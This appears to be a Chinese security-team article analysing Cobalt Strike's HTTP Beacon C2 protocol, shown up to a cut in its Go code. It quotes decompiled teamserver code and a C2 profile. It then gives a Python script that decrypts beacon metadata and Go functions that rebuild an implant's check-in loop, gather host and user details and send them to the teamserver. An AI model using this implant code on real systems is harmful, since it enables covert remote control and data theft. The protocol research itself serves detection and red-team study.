#  【干货】cobaltstrike通信协议研究

原创 罗逸  [ 平安集团安全应急响应中心 ](javascript:void\(0\);)

**平安集团安全应急响应中心** ![]()

微信号 PSRC_Team

功能介绍 平安集团安全应急响应中心隶属于平安科技，是外部用户向平安集团反馈各产品和业务安全漏洞的平台，也是平安科技加强与安全界和同仁合作交流的渠道之一。

____

__

收录于话题

#PSRC 61 个

#漏洞分析 3 个

**作者简介  **/Profile/

罗逸，平安科技银河实验室资深安全研究员，从业7年，专注红蓝对抗研究，擅长免杀技术、目标控制、内网渗透等。

  
  
 **目录** 0x01 HTTP/HTTPS Beacon通信过程         1.1 Beacon的源数据包
1.1.1 封包、解包http get请求                         解包                         封包
1.1.2 解析Beacon 源数据                         解析                         验证解析
封包                         测试上线         1.2 下发Beacon的task数据
1.2.1 封装task任务数据                 1.2.2 task任务的数据格式                 1.2.3
使用python脚本测试解包                 1.2.4 使用golang完成解包         1.3
Beacon返回的task任务数据                 1.3.1 解析返回的task任务数据                 1.3.2
task任务返回数据的格式                 1.3.3 使用python解析task任务返回的数据
1.3.4 使用golang封包task返回的任务数据0x02 跨平台http/https Beacon0x03 Bind tcp Beacon通信过程
3.1 解析bindtcp源数据                 3.1.1 验证解析数据                 3.1.2
golang模拟connect命令封包                 3.1.3 关于hint         3.2 解析bindtcp
task返回数据                 3.2.1 验证解析数据                 3.2.2 golang模拟发送请求0x04
跨平台的bindtcp Beacon         4.1 子beacon的任务过程         4.2 父beacon的任务过程

  

  
 **第一部分** **HTTP/HTTPS Beacon通信过程**  
![](https://gitee.com/fuli009/images/raw/master/public/20220218134442.png)  

#

如上：  
1\. 我们的beacon先是搜集主机的一些信息和生成一个随机的bid然后通过rsa加密后用http协议get方式将数据发送给teamserver；2\.
teamserver收到这个上线包之后，rsa解密获得主机信息，并显示在target列表中；3\.
beacon发送上线包之后就会进入一个while循环，等到sleep时间到了之后，就http
get去；teamserver拉取命令列表，如果此时的teamserver没得命令，就又进入休眠时间；4\. 当我们在teamserver的beacon
console中输入了命令时，beacon http get拉取命令命令时，teamserver就会在http get
response中返回命令队列，beacon收到队列后依次去执行；5\.
执行时，如果有执行结果返回，beacon会等待当前的休眠周期结束，结束休眠周期后，通过httppost方法将AES加密的执行结果返回给teamserver；6\.
teamserver会模拟一个http post response返回给beacon，使得这个http请求看起来是合理的。  
  

 **1.1 Beacon的源数据包**

  
beacon上线时，会收集一些当前机器的信息和生成一个随机的bid并用teamserver中生成的公钥进行加密，然后还需要根据我们指定的profile中模拟的http请求进行进行一次封装，最后再通过http
get请求发送到teamserver。  
 **1.1.1 封包、解包http get请求**  
 **解包**  
cobaltstrike从http
get请求中提取加密之后的源数据，代码如下：（decompiled_src/beacon/BeaconHTTP.java）：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    public byte[] serve(String var1, String var2, Properties var3, Properties var4) {    //获取get请求的远程地址，即http回连的外网地址    String var5 = ServerUtils.getRemoteAddress(BeaconHTTP.this.c2profile, var3);    //根据profile在get请求中获取rsa加密后的metadata的hexString    String var6 = BeaconHTTP.this.c2profile.recover(".http-get.client.metadata", var3, var4, BeaconHTTP.this.getPostedData(var4), var1);    //判断源数据是否有效，加密后的源数据是定长的，始终是128字节    if (var6.length() != 0 && var6.length() == 128) {        //监听器        //var5=回连的外网地址        //加密后的元数据字节数组        //null        //0        BeaconEntry var7 = BeaconHTTP.this.controller.process_beacon_metadata(BeaconHTTP.this.listener, var5, CommonUtils.toBytes(var6), (String)null, 0);        if (var7 == null) {            MudgeSanity.debugRequest(".http-get.client.metadata", var3, var4, "", var1, var5);            return new byte[0];        } else {            //获取beacon队列任务            byte[] var8 = BeaconHTTP.this.controller.dump(var7.getId(), 921600, 1048576);            //任务队列有任务            if (var8.length > 0) {                //返回解密的任务数据                byte[] var9 = BeaconHTTP.this.controller.getSymmetricCrypto().encrypt(var7.getId(), var8);                return var9;            } else {                return new byte[0];            }        }    } else {        CommonUtils.print_error("Invalid session id");        MudgeSanity.debugRequest(".http-get.client.metadata", var3, var4, "", var1, var5);        return new byte[0];    }}

  
这里实际解析profile是在decompiled_src/c2profile/Profile.java的recover函数和decompiled_src/c2profile/Program.java的recover函数，代码台长，就不贴了。原理如下：  
比如我们编写一个profile，其中有关于http get请求的模拟设置如下：  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    http-get {    set uri "/api/getid";    client {        header "Accept" "*/*";        metadata {            base64;            prepend "SESSIONID=";            header "Cookie";        }    }  
        server {        header "Server" "Pingan Frontend Proxy";        header "x-pingan-id" "wwvdT1M01kspYwKlmJIe0delKPUqYiRw6VYJKw9kekjO01FMl2QIStx=";        header "X-Frame-Options" "SAMEORIGIN";        header "Content-Type" "image/png";        output {           # mask;            base64;            prepend ".PNG";            print;        }    }}

  
使用c2lint解析之后的实际http get请求如下：

  *   *   *   * 

    
    
    GET /api/getid HTTP/1.1Accept: */*Cookie: SESSIONID=WI71wcgrH+kAG/NBYK5qCQ==User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.177

  
其中Cookie中对应的SESSIONID的值就是加密之后的源数据。这里的Cookie和SESSIONID是自定义的，所以需要cobaltstrike根据实际的profile解析。  
  
当收到http
get请求时，cobaltstrike就会根据profile的设置提取出Cookie中SESSIONID的值，也就是WI71wcgrH+kAG/NBYK5qCQ==，将这个值进行base64解密，得到的就是rsa加密后的源数据。  
 **封包 ****  
**模拟对于的http get的请求完善http header。

  *   *   *   *   *   * 

    
    
     Getheader = req.Header{    "Cookie":"SESSIONID=%ENCDATA%",    "Accept":"*/*",    "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; NP06)",  
    }

  
然后将需要发送的数据替换其中的%ENCDATA%，再进行http 发送。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    func HttpGet(url string, encData string) []byte {    httpRequest := req.New()    for k,v := range config.Getheader{        if strings.Contains(v,"%ENCDATA%"){            config.Getheader[k] = strings.Replace(v, "%ENCDATA%", encData, -1 )        }    }  
        resp, err := httpRequest.Get(url, config.Getheader)    if err != nil {        fmt.Printf("[-] Get http data error: %s\n", err.Error())        return  nil    }  
        defer resp.Response().Body.Close()    if resp.Response().StatusCode != http.StatusOK {        fmt.Printf("[-] Get http response status code: %s\n", resp.Response().StatusCode)        return nil    }else {        return resp.Bytes()    }}

  
调用httpGet函数，将beacon的源数据发送到ts。

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    func FirstBlood() bool {    encryptedMetaInfo = EncryptedMetaInfo()    for {        respBytes := HttpGet(config.GetUrl, encryptedMetaInfo)        if respBytes != nil {            break        }        time.Sleep(time.Duration(config.Sleep) * time.Millisecond)    }    return true}

  
 **1.1.2** **解析** **Beacon** **源数据 ****  
****解析 ****  
**将rsa加密之后的源数据提取出来之后，就需要解密这些源数据，dns/AsymmetricCrypto.class

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     public byte[] decrypt(byte[] var1) {    byte[] var2 = new byte[0];  
        try {        //rsa解密        synchronized(this.cipher) {            this.cipher.init(2, this.privatekey);            var2 = this.cipher.doFinal(var1);        }  
            DataInputStream var3 = new DataInputStream(new ByteArrayInputStream(var2));        int var4 = var3.readInt();        if (var4 != 48879) { //对比魔术头 4字节            System.err.println("Magic number failed :( [RSA decrypt]");            return new byte[0];        } else {            int var5 = var3.readInt();            if (var5 > 117) {//对比metadata数据长度 4字节                System.err.println("Length field check failed :( [RSA decrypt]");                return new byte[0];            } else {                byte[] var6 = new byte[var5];                var3.readFully(var6, 0, var5);                return var6;            }        }    } catch (Exception var8) {        MudgeSanity.logException("RSA decrypt", var8, false);        return new byte[0];    }}

  
处理解密之后的源数据src/beacon/BeaconC2.java：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    public BeaconEntry process_beacon_metadata(ScListener var1, String var2, byte[] var3, String var4, int var5) {    // 先用ts的私钥进行rsa解密    byte[] var6 = this.getAsymmetricCrypto().decrypt(var3);    if (var6 != null && var6.length != 0) {        //byte[] 转 string        String var7 = CommonUtils.bString(var6);        //16 globalkey，用来计算beacon task任务需要的AESkey和HashMac        String var8 = var7.substring(0, 16);        //2 编码相关        String var9 = WindowsCharsets.getName(CommonUtils.toShort(var7.substring(16, 18)));        //2 编码相关        String var10 = WindowsCharsets.getName(CommonUtils.toShort(var7.substring(18, 20)));  
            String var11 = ""; //回连的listener名称        BeaconEntry var12;        if (var1 != null) {            var11 = var1.getName();        } else if (var4 != null) {            //父beacon对应的回连的listener            var12 = this.getCheckinListener().resolveEgress(var4);            if (var12 != null) {                var11 = var12.getListenerName();            }        }  
            //////////////        //var6 rsa 解密后的数据        //var9 编码相关参数        //var2 回连的外网ip        //var11 监听器名称        //////////////        var12 = new BeaconEntry(var6, var9, var2, var11);        if (!var12.sane()) {            CommonUtils.print_error("Session " + var12 + " metadata validation failed. Dropping");            return null;        } else {            // beaconid            //var9 编码相关参数            //var10 编码相关参数            this.getCharsets().register(var12.getId(), var9, var10);            //父beacon不为空，说明是通过父beacon向外连接的            if (var4 != null) {                //初始化link的父beacon                var12.link(var4, var5);            }  
                //将回连Beacon的bid和他的Global key进行绑定            this.getSymmetricCrypto().registerKey(var12.getId(), CommonUtils.toBytes(var8));            if (this.getCheckinListener() != null) {                this.getCheckinListener().checkin(var1, var12);            } else {                CommonUtils.print_stat("Checkin listener was NULL (this is good!)");            }  
                return var12;        }    } else {        CommonUtils.print_error("decrypt of metadata failed");        return null;    }}

  
解析源数据，对应的代码decompiled_src/common/BeaconEntry.java。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    //var1 源数据public BeaconEntry(byte[] var1, String var2, String var3, String var4) {    boolean var5;    try {        DataParser var6 = new DataParser(var1);        var6.big();        //跳过前20字节（16字节globalkey+2字节ANSI+2字节OEM）        var6.consume(20);        this.id = Long.toString(CommonUtils.toUnsignedInt(var6.readInt()));//bid 4字节        this.pid = Long.toString(CommonUtils.toUnsignedInt(var6.readInt()));//pid 4字节        this.port = Integer.toString(CommonUtils.toUnsignedShort(var6.readShort()));//port 2字节        byte var7 = var6.readByte(); //metaDataFlag，用来判断barch的 1字节        if (CommonUtils.Flag(var7, 1)) {            this.barch = "";            this.pid = "";            this.is64 = "";        } else if (CommonUtils.Flag(var7, 2)) {            this.barch = "x64";        } else {            this.barch = "x86";        }  
            this.is64 = CommonUtils.Flag(var7, 4) ? "1" : "0";        var5 = CommonUtils.Flag(var7, 8);        byte var8 = var6.readByte();//大版本号 1字节        byte var9 = var6.readByte();//小版本号 1字节        this.ver = var8 + "." + var9;        this.build = var6.readShort();//构建号 2字节        byte[] var10 = var6.readBytes(4); //gmh_gpa 4字节        this.ptr_gmh = var6.readBytes(4); //gmh函数地址 4字节        this.ptr_gpa = var6.readBytes(4); //gpa函数地址 4字节        if ("x64".equals(this.barch)) {            this.ptr_gmh = CommonUtils.join(var10, this.ptr_gmh);            this.ptr_gpa = CommonUtils.join(var10, this.ptr_gpa);        }  
            this.ptr_gmh = CommonUtils.bswap(this.ptr_gmh);        this.ptr_gpa = CommonUtils.bswap(this.ptr_gpa);        var6.little();        this.intz = AddressList.toIP(CommonUtils.toUnsignedInt(var6.readInt()));//localip 4字节        var6.big();        if ("0.0.0.0".equals(this.intz)) {            this.intz = "unknown";        }    } catch (IOException var11) {        MudgeSanity.logException("Could not parse metadata!", var11, false);        this.sane = false;        return;    }    //上面的从meta data中获取的就是源数据头，是每个beacon回连的源数据都必须的，一共51字节  
        //后续的数据是一个字符串列表包括了机器名、用户名等。    String var12 = CommonUtils.bString(Arrays.copyOfRange(var1, 51, var1.length), var2);    String[] var13 = var12.split("\t");    if (var13.length > 0) {        this.comp = var13[0]; //机器名    }  
        if (var13.length > 1) {        this.user = var13[1]; //用户名    }  
        if (var13.length > 2) {        if (this.isSSH()) {            this.ver = var13[2]; //版本        } else {            this.proc = var13[2]; //process name        }    }  
        if (var5) {        this.user = this.user + " *"; //是否是管理员用户    }  
        this.ext = var3;    this.chst = var2;    this.lname = var4;    this.sane = this.sanity();}

‍  
Beacon并不是直接发送AES key和HMAC key而是发送Global key，然后cs计算这个字符串的哈希值
（32位），这个哈希值的前16位作为AES key后16位作为HMAC key，dns/BaseSecurity.java代码如下：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    public void registerKey(String var1, byte[] var2) {    synchronized(this) {        if (keymap.containsKey(var1)) {            return;        }    }  
        try {        MessageDigest var3 = MessageDigest.getInstance("SHA-256");        byte[] var4 = var3.digest(var2);        byte[] var5 = Arrays.copyOfRange(var4, 0, 16);        byte[] var6 = Arrays.copyOfRange(var4, 16, 32);        Session var7 = new Session();        var7.key = new SecretKeySpec(var5, "AES"); //aes key        var7.hash_key = new SecretKeySpec(var6, "HmacSHA256"); //HMAC        synchronized(this) {            keymap.put(var1, var7);        }    } catch (Exception var11) {        var11.printStackTrace();    }}

  
我们根据cobaltstrike解析源数据的方法，通过python来实现同样的功能，方便我们验证beacon的meta data，如下：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    '''Beacon元数据'''import binasciiimport hashlibimport M2Cryptoimport base64import hexdump  
    PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAJRT8xnRHtWnv2iL3Kqo0s5swaao...rH0+XxA0dI0=-----END RSA PRIVATE KEY-----"""  
    base64_key = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"  
    def HexToByte( hexStr ):    return bytes.fromhex(hexStr)  
    #encode_data = HexToByte("873b8a747e627424c23a2959b6314905fb3a683401eff8a792774f94c7cf5d4b363fa3cf70a83e86886fbab1eea85bde67aaed95f16dddfa2c76c310ca94f449e7945ba182e1c48a82aeb23adcad007e7a80666cefdad56a8c63a2077abddcd26d20cf962f052f1c7607cc8c5012ba50f126021d978c273edb54ecaf60f744a7")encode_data = base64.b64decode("DltOc8INq7p9Pv+hmkLuhvSAm+wH2RZ7sixOxf6U4+Jr46TAlDNBj06KcXB054BcdMDqp91+KW8R9VF8P49FYa3cPcqgiohmuEbGthjGLzgR3zEaUvuQ7xriMsjgbqNQ1+/2bdqsHYtVBT+GPdddkrquZie7H+LGchaJfTy0wPA=")  
    pubkey = M2Crypto.RSA.load_key_string(PRIVATE_KEY.format(base64_key).encode())ciphertext = pubkey.private_decrypt(encode_data, M2Crypto.RSA.pkcs1_padding)  
    def isFlag(var, flag):    return (var & flag) == flag  
      
    def toIP(var):    var2 = (var & -16777216) >> 24    var4 = (var & 16711680) >> 16    var6 = (var & 65280) >> 8    var8 = var & 255    return str(var2) + "." + str(var4) + "." + str(var6) + "." + str(var8)  
      
    def getName(var0):    if var0 == 37:        return "IBM037"    elif var0 == 437:        return "IBM437"    elif var0 == 500:        return "IBM500"    elif var0 == 708:        return "ISO-8859-6"    elif var0 == 709:        return ""    elif var0 == 710:        return ""    elif var0 == 720:        return "IBM437"    elif var0 == 737:        return "x-IBM737"    elif var0 == 775:        return "IBM775"    elif var0 == 850:        return "IBM850"    elif var0 == 852:        return "IBM852"    elif var0 == 855:        return "IBM855"    elif var0 == 857:        return "IBM857"    elif var0 == 858:        return "IBM00858"    elif var0 == 860:        return "IBM860"    elif var0 == 861:        return "IBM861"    elif var0 == 862:        return "IBM862"    elif var0 == 863:        return "IBM863"    elif var0 == 864:        return "IBM864"    elif var0 == 865:        return "IBM865"    elif var0 == 866:        return "IBM866"    elif var0 == 869:        return "IBM869"    elif var0 == 870:        return "IBM870"    elif var0 == 874:        return "x-windows-874"    elif var0 == 875:        return "IBM875"    elif var0 == 932:        return "Shift_JIS"    elif var0 == 936:        return "x-mswin-936"    elif var0 == 949:        return "x-windows-949"    elif var0 == 950:        return "Big5"    elif var0 == 1026:        return "IBM1026"    elif var0 == 1047:        return "IBM1047"    elif var0 == 1140:        return "IBM01140"    elif var0 == 1141:        return "IBM01141"    elif var0 == 1142:        return "IBM01142"    elif var0 == 1143:        return "IBM01143"    elif var0 == 1144:        return "IBM01144"    elif var0 == 1145:        return "IBM01145"    elif var0 == 1146:        return "IBM01146"    elif var0 == 1147:        return "IBM01147"    elif var0 == 1148:        return "IBM01148"    elif var0 == 1149:        return "IBM01149"    elif var0 == 1200:        return "UTF-16LE"    elif var0 == 1201:        return "UTF-16BE"    elif var0 == 1250:        return "windows-1250"    elif var0 == 1251:        return "windows-1251"    elif var0 == 1252:        return "windows-1252"    elif var0 == 1253:        return "windows-1253"    elif var0 == 1254:        return "windows-1254"    elif var0 == 1255:        return "windows-1255"    elif var0 == 1256:        return "windows-1256"    elif var0 == 1257:        return "windows-1257"    elif var0 == 1258:        return "windows-1258"    elif var0 == 1361:        return "x-Johab"    elif var0 == 10000:        return "x-MacRoman"    elif var0 == 10001:        return ""    elif var0 == 10002:        return ""    elif var0 == 10003:        return ""    elif var0 == 10004:        return "x-MacArabic"    elif var0 == 10005:        return "x-MacHebrew"    elif var0 == 10006:        return "x-MacGreek"    elif var0 == 10007:        return "x-MacCyrillic"    elif var0 == 10008:        return ""    elif var0 == 10010:        return "x-MacRomania"    elif var0 == 10017:        return "x-MacUkraine"    elif var0 == 10021:        return "x-MacThai"    elif var0 == 10029:        return "x-MacCentralEurope"    elif var0 == 10079:        return "x-MacIceland"    elif var0 == 10081:        return "x-MacTurkish"    elif var0 == 10082:        return "x-MacCroatian"    elif var0 == 12000:        return "UTF-32LE"    elif var0 == 12001:        return "UTF-32BE"    elif var0 == 20000:        return "x-ISO-2022-CN-CNS"    elif var0 == 20001:        return ""    elif var0 == 20002:        return ""    elif var0 == 20003:        return ""    elif var0 == 20004:        return ""    elif var0 == 20005:        return ""    elif var0 == 20105:        return ""    elif var0 == 20106:        return ""    elif var0 == 20107:        return ""    elif var0 == 20108:        return ""    elif var0 == 20127:        return "US-ASCII"    elif var0 == 20261:        return ""    elif var0 == 20269:        return ""    elif var0 == 20273:        return "IBM273"    elif var0 == 20277:        return "IBM277"    elif var0 == 20278:        return "IBM278"    elif var0 == 20280:        return "IBM280"    elif var0 == 20284:        return "IBM284"    elif var0 == 20285:        return "IBM285"    elif var0 == 20290:        return "IBM290"    elif var0 == 20297:        return "IBM297"    elif var0 == 20420:        return "IBM420"    elif var0 == 20423:        return ""    elif var0 == 20424:        return "IBM424"    elif var0 == 20833:        return ""    elif var0 == 20838:        return "IBM-Thai"    elif var0 == 20866:        return "KOI8-R"    elif var0 == 20871:        return "IBM871"    elif var0 == 20880:        return ""    elif var0 == 20905:        return ""    elif var0 == 20924:        return ""    elif var0 == 20932:        return "EUC-JP"    elif var0 == 20936:        return "GB2312"    elif var0 == 20949:        return ""    elif var0 == 21025:        return "x-IBM1025"    elif var0 == 21027:        return ""    elif var0 == 21866:        return "KOI8-U"    elif var0 == 28591:        return "ISO-8859-1"    elif var0 == 28592:        return "ISO-8859-2"    elif var0 == 28593:        return "ISO-8859-3"    elif var0 == 28594:        return "ISO-8859-4"    elif var0 == 28595:        return "ISO-8859-5"    elif var0 == 28596:        return "ISO-8859-6"    elif var0 == 28597:        return "ISO-8859-7"    elif var0 == 28598:        return "ISO-8859-8"    elif var0 == 28599:        return "ISO-8859-9"    elif var0 == 28603:        return "ISO-8859-13"    elif var0 == 28605:        return "ISO-8859-15"    elif var0 == 29001:        return ""    elif var0 == 38598:        return "ISO-8859-8"    elif var0 == 50220:        return "ISO-2022-JP"    elif var0 == 50221:        return "ISO-2022-JP-2"    elif var0 == 50222:        return "ISO-2022-JP"    elif var0 == 50225:        return "ISO-2022-KR"    elif var0 == 50227:        return "ISO-2022-CN"    elif var0 == 50229:        return "ISO-2022-CN"    elif var0 == 50930:        return "x-IBM930"    elif var0 == 50931:        return ""    elif var0 == 50933:        return "x-IBM933"    elif var0 == 50935:        return "x-IBM935"    elif var0 == 50936:        return ""    elif var0 == 50937:        return "x-IBM937"    elif var0 == 50939:        return "x-IBM939"    elif var0 == 51932:        return "EUC-JP"    elif var0 == 51936:        return "GB2312"    elif var0 == 51949:        return "EUC-KR"    elif var0 == 51950:        return ""    elif var0 == 52936:        return "GB2312"    elif var0 == 54936:        return "GB18030"    elif var0 == 57002:        return "x-ISCII91"    elif var0 == 57003:        return "x-ISCII91"    elif var0 == 57004:        return "x-ISCII91"    elif var0 == 57005:        return "x-ISCII91"    elif var0 == 57006:        return "x-ISCII91"    elif var0 == 57007:        return "x-ISCII91"    elif var0 == 57008:        return "x-ISCII91"    elif var0 == 57009:        return "x-ISCII91"    elif var0 == 57010:        return "x-ISCII91"    elif var0 == 57011:        return "x-ISCII91"    elif var0 == 65000:        return ""    elif var0 == 65001:        return "UTF-8"  
      
    if ciphertext[0:4] == b'\x00\x00\xBE\xEF':    print("ciphertext: ",binascii.b2a_hex(ciphertext))    # 16    raw_aes_keys = ciphertext[8:24]  
        # 2    var9 = ciphertext[24:26]    var9 = int.from_bytes(var9, byteorder='little', signed=False)    var9 = getName(var9)    # 2    var10 = ciphertext[26:28]    var10 = int.from_bytes(var10, byteorder='little', signed=False)    var10 = getName(var10)  
        # 4    id = ciphertext[28:32]    id = int.from_bytes(id, byteorder='big', signed=False)    print("Beacon id:%x"%id)  
        # 4    pid = ciphertext[32:36]    pid = int.from_bytes(pid, byteorder='big', signed=False)    print("pid:{}".format(pid))  
        # 2    port = ciphertext[36:38]    port = int.from_bytes(port, byteorder='big', signed=False)    print("port:{}".format(port))  
        # 1    flag = ciphertext[38:39]    flag = int.from_bytes(flag, byteorder='big', signed=False)    # print(flag)  
        if isFlag(flag, 1):        barch = ""        pid = ""        is64 = ""    elif isFlag(flag, 2):        barch = "x64"    else:        barch = "x86"  
        if isFlag(flag, 4):        is64 = "1"    else:        is64 = "0"  
        if isFlag(flag, 8):        bypassuac = "True"    else:        bypassuac = "False"  
        print("barch:" + barch)    print("is64:" + is64)    print("bypass:" + bypassuac)  
        # 2    var_1 = ciphertext[39:40]    var_2 = ciphertext[40:41]    var_1 = int.from_bytes(var_1, byteorder='big', signed=False)    var_2 = int.from_bytes(var_2, byteorder='big', signed=False)    windows_var = str(var_1) + "." + str(var_2)    print("windows var:" + windows_var)  
        # 2    windows_build = ciphertext[41:43]    windows_build = int.from_bytes(windows_build, byteorder='big', signed=False)    print("windows build:{}".format(windows_build))  
        # 4    x64_P = ciphertext[43:47]  
        # 4    ptr_gmh = ciphertext[47:51]    # 4    ptr_gpa = ciphertext[51:55]  
        # if ("x64".equals(this.barch)) {    # this.ptr_gmh = CommonUtils.join(var10, this.ptr_gmh)    # this.ptr_gpa = CommonUtils.join(var10, this.ptr_gpa)    # }    #    # this.ptr_gmh = CommonUtils.bswap(this.ptr_gmh)    # this.ptr_gpa = CommonUtils.bswap(this.ptr_gpa)  
        # 4    intz = ciphertext[55:59]    intz = int.from_bytes(intz, byteorder='little', signed=False)    intz = toIP(intz)  
        if intz == "0.0.0.0":        intz = "unknown"    print("host:" + intz)  
        if var9 == None:        ddata = ciphertext[59:len(ciphertext)].decode("ISO8859-1")    else:        # ??x-mswin-936        # ddata = ciphertext[59:len(ciphertext)].decode(var9)        ddata = ciphertext[59:len(ciphertext)].decode("ISO8859-1")  
        ddata = ddata.split("\t")    if len(ddata) > 0:        computer = ddata[0]    if len(ddata) > 1:        username = ddata[1]    if len(ddata) > 2:        process = ddata[2]  
        print("PC name:" + computer)    print("username:" + username)    print("process name:" + process)  
        raw_aes_hash256 = hashlib.sha256(raw_aes_keys)    digest = raw_aes_hash256.digest()    aes_key = digest[0:16]    hmac_key = digest[16:]  
        print("AES key:{}".format(aes_key.hex()))    print("HMAC key:{}".format(hmac_key.hex()))  
        print(hexdump.hexdump(ciphertext))

  
 **验证解析 ****  
**我们使用cobaltstrike新建一个http的监听，执行上线，然后使用wareshark抓取返回的数据。
![](https://gitee.com/fuli009/images/raw/master/public/20220218134443.png)  
解析后的结果如下：  
  
![](https://gitee.com/fuli009/images/raw/master/public/20220218134445.png)  
其中的AES key用来加解密后续此beacon的task任务，HAMC用来验证task任务返回数据的正确性。  
 **封包 ****  
**根据cobaltstrike的解析源数据的过程，我们得到metadata源数据的格式如下：  
![](https://gitee.com/fuli009/images/raw/master/public/20220218134446.png)  
我们用golang来实现的对应的封装源数据的过程，如下：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    func MakeMetaInfo() []byte {  
        clientIDBytes := make([]byte, 4)    binary.BigEndian.PutUint32(clientIDBytes, uint32(config.ClientID))  
        processID := sysinfo.GetPID()    processIDBytes := make([]byte, 4)    binary.BigEndian.PutUint32(processIDBytes, uint32(processID))  
        port := 22    sshPortBytes := make([]byte, 2)    binary.BigEndian.PutUint16(sshPortBytes, uint16(port))  
        metadataFlag := sysinfo.GetMetaDataFlag()    flagBytes := make([]byte, 1)    flagBytes[0] = byte(metadataFlag)  
        //for OS Version    osVersion := sysinfo.GetOSVersion()    osVerSlice := strings.Split(string(osVersion), ".")    osMajorVerison := 0    osMinorVersion := 0    osBuild := 0    if len(osVerSlice) == 3 {        osMajorVerison, _ = strconv.Atoi(osVerSlice[0])        osMinorVersion, _ = strconv.Atoi(osVerSlice[1])        osBuild, _ = strconv.Atoi(osVerSlice[2])    } else if len(osVerSlice) == 2 {        osMajorVerison, _ = strconv.Atoi(osVerSlice[0])        osMinorVersion, _ = strconv.Atoi(osVerSlice[1])    }    majorVerBytes := make([]byte, 1)    minorVerBytes := make([]byte, 1)    buildBytes := make([]byte, 2)    majorVerBytes[0] = byte(osMajorVerison)    minorVerBytes[0] = byte(osMinorVersion)    binary.BigEndian.PutUint16(buildBytes, uint16(osBuild))  
        ptrGMHGPA := 0    ptrGMHGPABytes := make([]byte, 4)    binary.BigEndian.PutUint32(ptrGMHGPABytes, uint32(ptrGMHGPA))  
        ptrGMHFuncAddr := 0    ptrGMHBytes := make([]byte, 4)    binary.BigEndian.PutUint32(ptrGMHBytes, uint32(ptrGMHFuncAddr))  
        ptrGPAFuncAddr := 0    ptrGPABytes := make([]byte, 4)    binary.BigEndian.PutUint32(ptrGPABytes, uint32(ptrGPAFuncAddr))  
        localIP := sysinfo.GetLocalIPInt()    localIPBytes := make([]byte, 4)    binary.BigEndian.PutUint32(localIPBytes, uint32(localIP))  
        hostName := sysinfo.GetComputerName()    currentUser := sysinfo.GetUsername()    OS := sysinfo.GetCurrentOS()  
        osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, OS)    osInfoBytes := []byte(osInfo)    binary.BigEndian.PutUint32(localIPBytes, uint32(localIP))    onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes, flagBytes, majorVerBytes, minorVerBytes, buildBytes, ptrGMHGPABytes, ptrGMHBytes, ptrGPABytes, localIPBytes, osInfoBytes)  
